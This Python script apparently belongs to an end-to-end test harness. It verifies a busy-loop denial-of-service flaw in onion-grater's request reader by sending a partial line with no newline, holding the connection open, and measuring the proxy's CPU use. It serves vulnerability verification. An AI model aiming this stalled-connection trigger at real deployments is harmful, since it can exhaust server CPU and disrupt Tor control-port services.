#!/usr/bin/env python3
"""Verify the oversize/partial-line busy-loop DoS in get_client_request().

A client that sends a partial request (no '\n') and stalls should make
onion-grater busy-spin (MSG_PEEK returns the same buffered bytes every
iteration, find('\n') == -1, `continue`, no blocking). We measure the
onion-grater process CPU time over a 2s window while one connection holds a
partial line open.
"""

import os
import socket
import sys
import time

import e2e

CLOCK = os.sysconf("SC_CLK_TCK")  # usually 100


def cpu_ticks(pid):
    with open("/proc/{0}/stat".format(pid)) as f:
        parts = f.read().split()
    return int(parts[13]) + int(parts[14])  # utime + stime


def main():
    tor = og = out = None
    try:
        e2e.setup_veth_ip()
        e2e.write_torrc()
        tor = e2e.start_tor()
        prof = os.path.join(e2e.WORKDIR, "40_probe.yml")
        with open(prof, "w") as f:
            f.write("---\n- exe-paths: ['*']\n  users: ['*']\n  hosts: ['*']\n"
                    "  commands:\n    GETINFO:\n      - 'version'\n")
        e2e.set_profile(prof)
        og, out = e2e.start_onion_grater("dos")

        # idle baseline
        t0 = cpu_ticks(og.pid); time.sleep(2.0); t1 = cpu_ticks(og.pid)
        idle = (t1 - t0) / CLOCK
        print("idle CPU over 2s:            {:.2f} cpu-seconds".format(idle))

        # send a PARTIAL line (no newline) and stall (keep socket open)
        sock = socket.create_connection((e2e.VETH_IP, e2e.OG_PORT), timeout=5)
        sock.sendall(b"GETINFO versio")   # 14 bytes, no \n
        t0 = cpu_ticks(og.pid); time.sleep(2.0); t1 = cpu_ticks(og.pid)
        busy = (t1 - t0) / CLOCK
        print("CPU over 2s with stalled partial line: {:.2f} cpu-seconds".format(busy))
        sock.close()

        print()
        if busy > 1.0:
            print("CONFIRMED DoS: onion-grater busy-spins (~{:.0f}% of a core) on a "
                  "stalled partial line.".format(busy / 2 * 100))
            return 1
        print("Not reproduced (busy={:.2f}); the read appears to block.".format(busy))
        return 0
    finally:
        if og:
            e2e.stop(og)
        if out:
            out.close()
        e2e.stop(tor)
        e2e.cleanup_profile()
        e2e.teardown_veth_ip()


if __name__ == "__main__":
    sys.exit(main())
